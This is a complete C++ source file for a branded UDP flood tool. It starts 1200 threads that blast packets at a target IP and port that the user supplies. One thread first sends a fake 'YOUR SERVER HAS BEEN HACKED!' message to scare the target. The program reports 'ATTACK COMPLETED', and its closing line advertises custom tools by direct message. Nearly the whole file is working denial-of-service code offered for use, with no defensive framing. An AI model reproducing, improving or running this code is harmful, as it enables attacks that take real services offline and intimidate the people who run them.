#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 677
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define CYAN    "\033[1;36m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"
#define MAGENTA "\033[1;35m"

void smartTypewriter(const std::string& text, int delay = 35) {
    for (char c : text) {
        std::cout << c << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    std::cout << std::endl;
}

void showBanner() {
    std::cout << MAGENTA << R"(
==========================================================
   WELCOME TO ROHAN & SADIQ ADVANCED PACKET STORM TOOL
   Premium Power — Engineered by: @Rohan2349 & @Sadiq9869
==========================================================
)" << RESET;
}

void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize];
    std::memset(packet, 'A', packetSize);
    packet[packetSize - 1] = '\0';

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] packet;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    long long threadPackets = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    if (threadId == 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
        const char* fakeMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'okay' OR 'no' TO RESPOND (TRAP WARNING)";
        ssize_t bytesSent = sendto(udpSocket, fakeMessage, strlen(fakeMessage), 0,
                                   (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        }
    }

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                   (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet;
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                                 (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsReceived++;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    showBanner();

    if (argc != 5) {
        std::cerr << RED << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size>" << RESET << "\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);
    int numThreads = DEFAULT_NUM_THREADS;

    if (targetIp.empty()) targetIp = "127.0.0.1";
    if (durationSeconds <= 0) durationSeconds = 10;
    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) packetSize = 1000;

    std::cout << YELLOW << "[*] Launching listener thread for reverse data detection...\n" << RESET;
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize);
    }

    std::cout << GREEN << "\n[BRUST MODE ACTIVE] Sending packets to " << targetIp << ":" << targetPort
              << " | Duration: " << durationSeconds << " sec | Packet: " << packetSize
              << " bytes | Threads: " << numThreads << RESET << "\n";

    for (auto& t : senderThreads) {
        t.join();
    }

    keepSending = false;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    keepReceiving = false;

    std::cout << YELLOW << "[*] Waiting for receiver thread to finish...\n" << RESET;
    receiverThread.join();

    std::cout << GREEN << R"(
================================================
                ATTACK COMPLETED
================================================
)" << RESET;

    std::cout << CYAN << "[*] Total Packets Sent   : " << totalPacketsSent << "\n";
    std::cout << "[*] Total Packets Received: " << totalPacketsReceived << "\n";
    std::cout << "[*] Total Data Sent       : " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n" << RESET;
    std::cout << MAGENTA << "\nPowered by @Rohan2349 & @Sadiq9869 - DM for custom tools" << RESET << "\n";

    return 0;
}
